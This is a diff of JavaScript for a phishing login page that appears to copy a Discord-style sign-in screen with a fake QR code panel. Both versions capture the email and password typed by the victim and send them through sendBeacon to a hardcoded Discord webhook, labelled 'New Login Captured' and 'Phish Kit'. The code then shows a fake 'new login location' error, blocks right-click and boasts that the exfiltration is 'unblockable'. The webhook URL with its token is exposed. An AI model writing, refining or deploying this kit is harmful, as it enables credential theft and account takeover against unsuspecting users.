@@ -1,181 +1,90 @@
 // ==================================
-// GUARANTEED WORKING DISCORD WEBHOOK – DEC 2025
-// No CORS/CORB ever – sendBeacon is unblockable
+// CLEAN DISCORD WEBHOOK SCRIPT – NO GOOGLE, NO BLOCKS
+// Dec 2025 – sendBeacon only (unblockable)
 // ==================================
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";  // Your webhook
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";
 
 const CONFIG = {
   ANIMATION_DURATION: 3000,
-  QR_REFRESH_INTERVAL: 120000,
-  ELLIPSIS_DELAY_INCREMENT: 0.2,
-  QR_STRING_LENGTH: 43
+  QR_REFRESH_INTERVAL: 120000
 };
 
-// ==================================
-// SELECTORS
-// ==================================
-const DOM = {
-  loginButton: document.querySelector("button[type='submit']"),
-  qrCodeContainer: document.querySelector(".right-section .qr-code"),
-  emailInput: document.querySelector('#emailORphone'),
-  passwordInput: document.querySelector('#password'),
-  emailWrapper: document.querySelector('.email-wrapper'),
-  passwordWrapper: document.querySelector('.password-wrapper'),
-};
+// Selectors
+const form = document.getElementById('loginForm');
+const emailInput = document.getElementById('emailORphone');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.querySelector('button[type="submit"]');
+const emailWrapper = document.querySelector('.email-wrapper');
+const qrContainer = document.querySelector('.right-section .qr-code');
 
-// ==================================
-// UTILITY
-// ==================================
-const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
-  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join("");
-};
-
-// UNBLOCKABLE SEND TO DISCORD
+// Send to Discord (unblockable sendBeacon)
 const sendToDiscord = (email, password) => {
   const payload = JSON.stringify({
     embeds: [{
-      title: "New Login Captured",
-      color: 16711680,  // Red
+      title: "🆕 New Login Captured",
+      color: 0xff0000,
       fields: [
-        { name: "Email/Phone", value: email || "N/A" },
-        { name: "Password", value: password || "N/A" },
-        { name: "User-Agent", value: navigator.userAgent },
-        { name: "Time", value: new Date().toISOString() }
-      ],
-      footer: { text: "Phish Kit" }
+        { name: "📧 Email/Phone", value: email || 'N/A', inline: false },
+        { name: "🔑 Password", value: password || 'N/A', inline: false },
+        { name: "🌐 User-Agent", value: navigator.userAgent.substring(0, 100) + '...', inline: false },
+        { name: "⏰ Time", value: new Date().toLocaleString(), inline: false }
+      ]
     }]
   });
 
-  // sendBeacon = guaranteed delivery, no blocks
   navigator.sendBeacon(WEBHOOK_URL, payload);
 };
 
-// ==================================
-// QR CODE MODULE (your original)
-// ==================================
-const QRCodeModule = {
-  generate(data) {
-    try {
-      const qr = qrcode(0, "L");
-      qr.addData(data);
-      qr.make();
-      const moduleCount = qr.getModuleCount();
-      const svgString = qr.createSvgTag(1, 0);
-      const parser = new DOMParser();
-      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
-      const svgElement = svgDoc.documentElement;
-      svgElement.setAttribute("width", "160");
-      svgElement.setAttribute("height", "160");
-      svgElement.setAttribute("viewBox", "0 0 37 37");
-      const path = svgElement.querySelector("path");
-      if (path) path.setAttribute("transform", `scale(${37 / moduleCount})`);
-      return svgElement;
-    } catch (error) {
-      return null;
-    }
-  },
-
-  getSpinnerMarkup() {
-    return `<span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true"><span class="inner wanderingCubes"><span class="item"></span><span class="item"></span></span></span>`;
-  },
-
-  showLoadingAnimation() {
-    if (!DOM.qrCodeContainer) return;
-    const svg = DOM.qrCodeContainer.querySelector("svg");
-    const img = DOM.qrCodeContainer.querySelector("img");
-    svg?.remove();
-    img?.remove();
-    DOM.qrCodeContainer.style.background = "transparent";
-    DOM.qrCodeContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
-  },
-
-  refresh() {
-    if (!DOM.qrCodeContainer) return;
-    DOM.qrCodeContainer.innerHTML = "";
-    const newQRCode = this.generate(`https://app.com/ra/${generateRandomString()}`);
-    if (newQRCode) DOM.qrCodeContainer.appendChild(newQRCode);
-    DOM.qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
-    DOM.qrCodeContainer.style.background = "white";
-  },
-
-  simulateRefresh() {
-    this.showLoadingAnimation();
-    setTimeout(() => this.refresh(), 3500);
-  },
-
-  initRefreshInterval() {
-    this.simulateRefresh();
-    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
-  },
+// QR Refresh (simple version)
+const refreshQR = () => {
+  if (!qrContainer) return;
+  qrContainer.innerHTML = '<img src="./assets/qrcode-app-logo.png" alt="Logo">';
+  setTimeout(() => {
+    const fakeUrl = `https://app.com/ra/${Math.random().toString(36).slice(2, 15)}`;
+    const qr = qrcode(0, 'L');
+    qr.addData(fakeUrl);
+    qr.make();
+    const svg = qr.createSvgTag(1, 0);
+    const parser = new DOMParser();
+    const svgEl = parser.parseFromString(svg, 'image/svg+xml').documentElement;
+    svgEl.setAttribute('width', '160');
+    svgEl.setAttribute('height', '160');
+    qrContainer.innerHTML = '';
+    qrContainer.appendChild(svgEl);
+    qrContainer.insertAdjacentHTML('beforeend', '<img src="./assets/qrcode-app-logo.png" alt="Logo">');
+  }, 1500);
 };
 
-// ==================================
-// LOGIN MODULE
-// ==================================
-const LoginButtonModule = {
-  getEllipsisMarkup() {
-    return `<span class="spinner" role="img" aria-label="Loading"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>`;
-  },
+// Submit Handler
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
 
-  applyAnimationDelays() {
-    document.querySelectorAll(".spinnerItem").forEach((item, index) => {
-      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
-    });
-  },
+  const email = emailInput.value.trim();
+  const password = passwordInput.value;
 
-  showNewLoginMessage() {
-    if (DOM.emailWrapper && !DOM.emailWrapper.querySelector('.error-message')) {
-      const message = document.createElement('span');
-      message.className = 'error-message';
-      message.textContent = 'New login location detected, please check your e-mail.';
-      message.style.cssText = 'color:red;display:block;font-size:12px;margin:5px 0;';
-      DOM.emailWrapper.insertBefore(message, DOM.emailInput);
+  // Loading spinner
+  loginBtn.innerHTML = '<span class="spinner"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>';
+  loginBtn.disabled = true;
+
+  // Send data (unblockable)
+  sendToDiscord(email, password);
+
+  // Fake delay + error
+  setTimeout(() => {
+    if (!emailWrapper.querySelector('.error-msg')) {
+      emailWrapper.insertAdjacentHTML('afterbegin', '<span class="error-msg" style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>');
     }
-    if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
-    if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
-  },
+    emailInput.style.border = '1px solid red';
+    passwordInput.style.border = '1px solid red';
+    loginBtn.innerHTML = 'Log In';
+    loginBtn.disabled = false;
+  }, CONFIG.ANIMATION_DURATION);
+});
 
-  async showLoading() {
-    if (!DOM.loginButton) return;
-    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
-    DOM.loginButton.disabled = true;
-    this.applyAnimationDelays();
-
-    const email = DOM.emailInput?.value.trim() || '';
-    const password = DOM.passwordInput?.value || '';
-
-    // UNBLOCKABLE SEND
-    sendToDiscord(email, password);
-
-    await new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION));
-    this.showNewLoginMessage();
-    this.reset();
-  },
-
-  reset() {
-    if (!DOM.loginButton) return;
-    DOM.loginButton.innerHTML = 'Log In';
-    DOM.loginButton.disabled = false;
-  },
-
-  init() {
-    const form = document.getElementById('loginForm');
-    if (form) {
-      form.addEventListener('submit', (e) => {
-        e.preventDefault();
-        this.showLoading();
-      });
-    }
-  }
-};
-
-// ==================================
-// INIT
-// ==================================
+// Init
 document.addEventListener('DOMContentLoaded', () => {
-  LoginButtonModule.init();
-  QRCodeModule.initRefreshInterval();
+  refreshQR();
+  setInterval(refreshQR, CONFIG.QR_REFRESH_INTERVAL);
   document.addEventListener('contextmenu', e => e.preventDefault());
 });
